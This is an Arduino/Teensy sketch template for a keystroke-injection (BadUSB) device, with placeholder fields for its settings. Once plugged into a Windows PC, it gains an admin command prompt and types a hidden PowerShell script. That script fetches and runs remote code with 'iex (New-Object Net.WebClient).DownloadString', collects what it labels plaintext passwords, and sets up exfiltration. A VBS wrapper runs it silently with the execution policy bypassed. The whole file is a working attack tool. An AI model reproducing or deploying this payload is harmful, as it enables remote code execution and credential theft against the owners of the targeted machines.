#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif


void setup(){

  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Passwords in plain-text\" > %temp%\\dlp.ps1");
  Keyboard.println("echo $user = \"INPUT1\" >> %temp%\\dlp.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\dlp.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\dlp.ps1");
  Keyboard.println("echo iex ((New-Object Net.WebClient).DownloadString(\"INPUT4\")); >> %temp%\\dlp.ps1");
  Keyboard.println("echo $pv = iex (INPUT5) >> %temp%\\dlp.ps1");
  delay(2000);

  String fn = "dlp";
  String fp;
  EXFILCALLS

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dlp.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dlp.ps1\"),0,true >> %temp%\\dlp.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\dlp.vbs");
  delay(3000);

  Keyboard.println("exit");

}

void loop(){
}

DEFS
EXFILDEFS
